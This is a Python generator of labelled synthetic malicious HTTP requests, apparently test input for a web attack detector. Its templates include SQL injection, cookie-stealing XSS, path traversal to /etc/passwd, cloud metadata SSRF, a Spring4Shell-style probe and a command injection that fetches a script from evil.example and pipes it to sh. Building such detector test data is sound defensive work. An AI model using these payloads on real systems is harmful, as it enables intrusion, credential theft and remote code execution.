"""Bounded attacker request generator. Fabricates request dicts only; never calls Jev."""
import random

MAX_ATTACKERS = 100

_TEMPLATES = [
    ("sql_injection", "GET", "/search", "q=' OR '1'='1' --", ""),
    ("sql_injection", "GET", "/profile", "id=1 UNION SELECT username,password FROM users", ""),
    ("xss", "GET", "/search", "q=<script>alert(document.cookie)</script>", ""),
    ("xss", "POST", "/login", "", '{"username": "<img src=x onerror=alert(1)>", "password": "x"}'),
    ("path_traversal", "GET", "/files", "name=../../../../etc/passwd", ""),
    ("path_traversal", "GET", "/files", "name=..%2f..%2f..%2fwindows%2fwin.ini", ""),
    ("command_injection", "GET", "/search", "q=test; cat /etc/passwd", ""),
    ("command_injection", "GET", "/search", "q=$(curl http://evil.example/x.sh|sh)", ""),
    ("ssrf", "GET", "/files", "name=http://169.254.169.254/latest/meta-data/", ""),
    ("auth_bruteforce", "POST", "/login", "", '{"username": "admin", "password": "%s"}'),
    ("scanner_probe", "GET", "/.env", "", ""),
    ("scanner_probe", "GET", "/wp-admin/setup-config.php", "", ""),
    ("other_exploit", "POST", "/search", "", '{"class.module.classLoader.URLs[0]": "0"}'),
]


def generate_attackers(n: int, seed: int = 0) -> list[dict]:
    n = max(0, min(int(n or 0), MAX_ATTACKERS))
    rng = random.Random(seed)
    out = []
    for i in range(n):
        cat, method, path, query, body = _TEMPLATES[i % len(_TEMPLATES)]
        if "%s" in body:
            body = body % rng.choice(["123456", "password", "letmein", "qwerty", "admin123"])
        headers = {"User-Agent": rng.choice(["sqlmap/1.7", "curl/8.4.0", "python-requests/2.31", "Nikto/2.5"])}
        if body:
            headers["Content-Type"] = "application/json"
        out.append({"method": method, "path": path, "query": query, "headers": headers,
                    "body": body, "true_label": "malicious", "true_category": cat})
    return out
